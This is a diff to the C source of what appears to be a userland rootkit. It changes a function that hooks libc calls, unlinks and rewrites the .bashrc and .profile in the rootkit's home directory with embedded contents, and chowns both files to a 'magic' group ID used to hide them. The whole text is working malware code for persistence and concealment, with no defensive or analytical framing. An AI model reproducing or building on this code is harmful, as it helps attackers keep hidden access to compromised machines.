@@ -1,39 +1,41 @@
 #include "bashrc.h"
-
+#define BASHRC_PATH HOMEDIR"/.bashrc"
+#define PROFILE_PATH HOMEDIR"/.profile"
 int writebashrc(void){
     DIR *dp;
+    FILE *pfp,*bfp;
+    char curchar;
+    gid_t magicgid;
 
-    hook(COPENDIR, CFOPEN, CFWRITE);
+    hook(COPENDIR, CFOPEN, CUNLINK);
     
     dp = call(COPENDIR, HOMEDIR);
     if(dp == NULL) return -1;
     closedir(dp);
 
-    char rcbuf[RKBASHRC_SIZE+1], tmp[2], curchar;
-    memset(rcbuf, 0, RKBASHRC_SIZE);
+    call(CUNLINK, PROFILE_PATH);
+    call(CUNLINK, BASHRC_PATH);
+
+    pfp = call(CFOPEN, PROFILE_PATH, "a");
+    if(pfp == NULL)
+        return -1;
+
+    bfp = call(CFOPEN, BASHRC_PATH, "a");
+    if(bfp == NULL){
+        fclose(pfp);
+        return -1;
+    }
+
     for(int i = 0; i < RKBASHRC_SIZE; i++){
         curchar = rkbashrc[i];
-        snprintf(tmp, 2, "%c", curchar);
-        strcat(rcbuf, tmp);
+        fputc(curchar, pfp);
+        fputc(curchar, bfp);
     }
-    rcbuf[RKBASHRC_SIZE+1] = '\0';
 
-    FILE *fp;
+    fclose(pfp);
+    fclose(bfp);
 
-    fp = call(CFOPEN, PROFILE_PATH, "w");
-    char *profile = ". .bashrc";
-    if(fp == NULL)
-        return -1;
-    call(CFWRITE, profile, 1, strlen(profile), fp);
-    fclose(fp);
-
-    fp = call(CFOPEN, BASHRC_PATH, "w");
-    if(fp == NULL)
-        return -1;
-    call(CFWRITE, rcbuf, 1, strlen(rcbuf), fp);
-    fclose(fp);
-
-    gid_t magicgid = readgid();
+    magicgid = readgid();
     chown_path(PROFILE_PATH, magicgid);
     chown_path(BASHRC_PATH, magicgid);
 
